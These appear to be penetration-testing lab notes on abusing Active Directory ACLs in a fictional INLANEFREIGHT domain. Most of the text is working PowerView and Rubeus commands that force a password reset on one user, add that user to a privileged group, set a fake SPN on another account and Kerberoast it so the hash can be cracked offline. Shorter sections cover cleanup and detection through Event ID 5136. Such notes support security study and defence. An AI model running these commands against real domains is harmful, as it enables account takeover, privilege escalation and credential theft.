## Abusing ACLs

1. Use the wley user to change the password for the damundsen user
2. Authenticate as the damundsen user and leverage GenericWrite rights to add a user that we control to the Help Desk Level 1 group
3. Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user

**Creating a PSCredential Object
```
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```

**Creating a SecureString Object
```
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

**Changing the User's Password
```
cd C:\Tools\
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

**Creating a SecureString Object using damundsen
```
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

**Adding damundsen to the Help Desk Level 1 Group
```
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

**Confirming damundsen was Added to the Group
```
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```


## Targeted Kerberoast

**Creating a Fake SPN
```
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

**Kerberoasting with Rubeus
```
.\Rubeus.exe kerberoast /user:adunn /nowrap
```
- Crack password offline with Hashcat


## Cleanup
1. Remove the fake SPN we created on the adunn user
2. Removes the damundsen user from the Help Desk Level 1 group
3. Set the password for the damundsen user back to its orignial value or have our client set it/alert the user

**Removing the Fake SPN from adunn's Account
```
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

**Removing damundsen from the Help Desk Level 1 Group
```
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

**Confirming damundsen was Removed from the Group
```
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```


## Detection and Remediation
1. Auditing for and removing dangerous ACLs
2. Monitor group membership
3. Audit and monitor for ACL changes
- Event ID 5136 > Details > Security Descriptor Definition Language (SDDL)
- This is not readable, so use ConvertFrom-SddlString cmdlet

**Converting the SDDL String into a Readable Format
```
ConvertFrom-SddlString "O:BAG:BAD:AI<SNIP>(D;;DC;;;WD)" |select -ExpandProperty DiscretionaryAcl
```

